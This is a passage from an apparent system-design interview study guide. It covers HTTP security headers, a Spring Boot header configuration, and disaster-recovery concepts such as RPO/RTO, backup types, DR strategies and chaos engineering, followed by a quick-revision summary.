Content-Security-Policy: default-src 'self'

# Prevent MIME-type sniffing
X-Content-Type-Options: nosniff

# Prevent clickjacking (modern equivalent: CSP frame-ancestors 'none')
X-Frame-Options: DENY

# Force HTTPS for a year, including subdomains
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Don't leak full URLs to other sites
Referrer-Policy: strict-origin-when-cross-origin

# Disable powerful browser features you don't use
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

(The original notes included `Permissions-Policy: interest-cohort=()` to opt out of Google FLoC; FLoC was abandoned, so that directive is obsolete.)

**Spring Boot security headers:**

```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
    .frameOptions(frame -> frame.deny())
    .httpStrictTransportSecurity(hsts -> hsts
        .maxAgeInSeconds(31536000)
        .includeSubDomains(true))
);
```

**Quick revision (section 11)**
- Defense in depth, least privilege, zero trust.
- TLS in transit; encryption at rest; app-level encryption or tokenization for the most sensitive fields; KMS + envelope encryption.
- Passwords: BCrypt / Argon2id with salt — never fast hashes.
- Secrets: never in git; inject at runtime from a secrets manager; prefer dynamic short-lived credentials; rotate.
- SQLi → parameterized queries; XSS → output encoding + CSP; CSRF → tokens + SameSite; SSRF → allowlist + block private IPs; DDoS → edge protection + rate limits.

---

## 12. Disaster Recovery, Backups, RTO and RPO

> **Theme:** High availability handles a server dying. Disaster recovery handles a region burning down, a bad migration, or ransomware.

### 12.1 RTO and RPO

> **Level:** 🟢 Essential

**What are they?**
- **RPO — Recovery Point Objective:** the maximum acceptable **data loss**, measured in time. "RPO = 5 min" means after a disaster we may lose at most the last 5 minutes of writes. Driven by **how often you back up / replicate**.
- **RTO — Recovery Time Objective:** the maximum acceptable **downtime** — how long until service is restored. Driven by **how fast you can fail over or restore**.

```mermaid
flowchart LR
    lastBackup["Last good backup or replicated point"] -->|"RPO window - data written here is lost"| disaster["Disaster occurs"]
    disaster -->|"RTO window - service is down"| restored["Service restored"]
```

**Walkthrough:** if the last backup was at 02:00 and disaster strikes at 02:45, you lose 45 minutes of data (actual recovery point). If service is back at 04:00, downtime was 75 minutes (actual recovery time). Your design must keep both within the objectives.

| Business example | Typical RPO | Typical RTO |
|---|---|---|
| Payments / banking ledger | ≈ 0 (synchronous replication) | Minutes |
| E-commerce orders | Seconds to minutes | < 1 hour |
| Internal analytics | Hours to 1 day | 1 day |
| Static marketing site | 1 day | Hours |

Lower RPO and RTO always cost more — the business must decide what downtime and data loss are worth.

### 12.2 Backups

> **Level:** 🟢 Essential

| Backup type | What it copies | Restore speed | Storage |
|---|---|---|---|
| **Full** | Everything | Fastest restore (one set) | Largest |
| **Incremental** | Changes since the *last backup of any type* | Slowest (full + every incremental) | Smallest |
| **Differential** | Changes since the *last full* | Medium (full + latest differential) | Medium, grows until next full |
| **Point-in-time recovery (PITR)** | Base snapshot + continuous transaction log (WAL/binlog) archive | Restore to any second | Log storage |
| **Snapshots** | Storage-level point-in-time copy (EBS, RDS) | Fast | Incremental at block level |

**Rules:**
- **3-2-1 rule:** 3 copies of data, on 2 different media/storage types, 1 off-site (another region/account). Modern addition: **1 immutable/air-gapped copy** (object lock / WORM) against ransomware and accidental deletion by an admin.
- **Replication is not a backup.** A `DELETE FROM orders` or a corrupting bug replicates to every replica within milliseconds. You need point-in-time backups to go back *before* the mistake.
- **An untested backup is not a backup.** Regularly restore into a test environment and verify data; measure how long it takes (that is your real RTO).
- Encrypt backups and restrict who can delete them (separate account/permissions).

### 12.3 DR Strategies

> **Level:** 🟡 Intermediate

```mermaid
flowchart LR
    br["Backup and Restore - hours, cheapest"] --> pl["Pilot Light - tens of minutes"]
    pl --> ws["Warm Standby - minutes"]
    ws --> aa["Multi-Site Active-Active - near zero, most expensive"]
```

| Strategy | What runs in the DR region | RPO | RTO | Cost |
|---|---|---|---|---|
| **Backup and restore** | Nothing — only backups copied there | Hours (since last backup) | Hours to a day | $ |
| **Pilot light** | Core data replicated continuously (DB replica); app servers off, infra defined as code | Seconds to minutes | Tens of minutes to hours | $$ |
| **Warm standby** | Scaled-down but running full copy of the stack | Seconds | Minutes | $$$ |
| **Multi-site active-active** | Full production in two+ regions serving traffic | ≈ 0 to seconds | ≈ 0 (DNS / global LB shift) | $$$$ |

**How to choose:** start from the business RPO/RTO, then pick the cheapest strategy that meets them. Infrastructure as code (Terraform, CloudFormation) makes pilot light and warm standby practical, because you can recreate environments quickly and identically.

### 12.4 Testing DR, Game Days and Chaos Engineering

> **Level:** 🔴 Advanced

- **DR drills:** periodically fail over to the DR region for real (or restore from backup) and time it. Write and maintain **runbooks** for each scenario.
- **Game days:** scheduled exercises where the team simulates an incident (kill a DB primary, block a dependency) and practices detection, communication, and recovery.
- **Chaos engineering:** deliberately inject failures in production-like environments to verify the system behaves as expected — Netflix's Chaos Monkey (randomly kills instances), latency injection, AZ evacuation. Method: define steady state (SLIs) → hypothesize it holds under a failure → inject the failure with a small blast radius → observe → fix weaknesses. Tools: Chaos Monkey, Gremlin, LitmusChaos, AWS Fault Injection Service.
- **Blameless postmortems** after every incident: timeline, root causes, contributing factors, action items — focus on fixing systems, not blaming people.

**Interview perspective**
> **Q: What's the difference between high availability and disaster recovery?**
> High availability keeps the service running through *expected, local* failures — a server, a disk, an AZ — via redundancy and automatic failover, usually with zero data loss. Disaster recovery is about *large-scale or logical* disasters — losing a region, a corrupting bug, ransomware, someone deleting a table — measured by RPO and RTO. HA uses replication; DR also needs point-in-time, immutable, off-site backups, because replication faithfully copies mistakes.

> **Q: Your primary database is deleted by a bad script. How do you recover?**
> Stop the bleeding first (disable the job, block writes if needed). Restore the latest snapshot into a new instance and replay the WAL/binlog to just before the bad statement using point-in-time recovery. Verify data, then repoint the application (or copy the affected tables back). The time this takes is my real RTO, which is why I'd practice it. Afterward: postmortem, least-privilege credentials for scripts, guardrails on destructive operations, and delayed replicas or immutable backups.

**Quick revision (section 12)**
- RPO = how much data you can lose; RTO = how long you can be down.
- Replication ≠ backup; use PITR and immutable off-site copies (3-2-1-1).
- Backup-restore → pilot light → warm standby → active-active: lower RTO/RPO, higher cost.
- Test restores and failovers regularly; chaos engineering builds confidence.

---

## 13. Quick Revision

**Architecture**
- Start with a **modular monolith**; extract microservices for a concrete reason (scaling, release cadence, team ownership).
- Microservices = independent deploy + own data + one business capability; the cost is distributed-systems complexity (the "microservices tax").
- Draw boundaries with DDD bounded contexts; align with teams (Conway's Law); avoid the distributed monolith.
- Migrate incrementally with the **strangler fig**.
- **Database per service**; cross-service queries via API composition or CQRS read models; consistency via sagas and the outbox.
- Sidecars and service meshes move mTLS, retries, and telemetry out of app code — worthwhile at scale only.

**Event-driven, CQRS, event sourcing**
- Events are past-tense facts; prefer event-carried state transfer; consumers must be idempotent; evolve schemas compatibly.
- CQRS: separate write and read models; read side is eventually consistent.
- Event sourcing: store events, derive state; event store strong, projections eventual; snapshots for speed.

**Reliability**
- Slow dependencies cause cascading failures → timeouts, retries with backoff and jitter, circuit breakers, bulkheads, async.
- Graceful degradation for optional features; load shedding of low-priority traffic.
- Multi-AZ by default; multi-region active-passive or active-active when needed; test failover.
- Liveness ≠ readiness; liveness must not depend on downstreams.
- Ship safely: canary + metrics, blue-green for instant rollback, feature flags, expand-contract migrations.

**Observability**
- Metrics (what), traces (where), logs (why) linked by trace ID.
- Golden signals: latency, traffic, errors, saturation; use p95/p99.
- OpenTelemetry + W3C `traceparent`; alert on symptoms and SLO burn rate.
- SLI → SLO → SLA; error budget = 1 − SLO (99.9% ≈ 43.8 min/month).

**Security**
- 401 vs 403; sessions vs JWT trade-off is revocation vs lookup.
- JWT: short-lived access + rotating refresh tokens; RS256 + JWKS `kid` rotation; validate `iss`, `aud`, `exp`.
- OAuth 2.0 Authorization Code + PKCE; OIDC for login; RBAC plus object-level checks.
- Multi-tenancy: tenant ID from the signed token, enforced in queries and by row-level security.
- TLS everywhere, encryption at rest, KMS envelope encryption, BCrypt/Argon2 for passwords, secrets from a manager — never in git.

**Disaster recovery**
- RPO = data loss, RTO = downtime; replication isn't backup; 3-2-1 with an immutable copy; practice restores.

---

**Previous:** [Distributed Systems and Messaging](05_distributed_systems_and_messaging.md) · **Next:** [Interview Problems Part 1](07_interview_problems_part1.md)
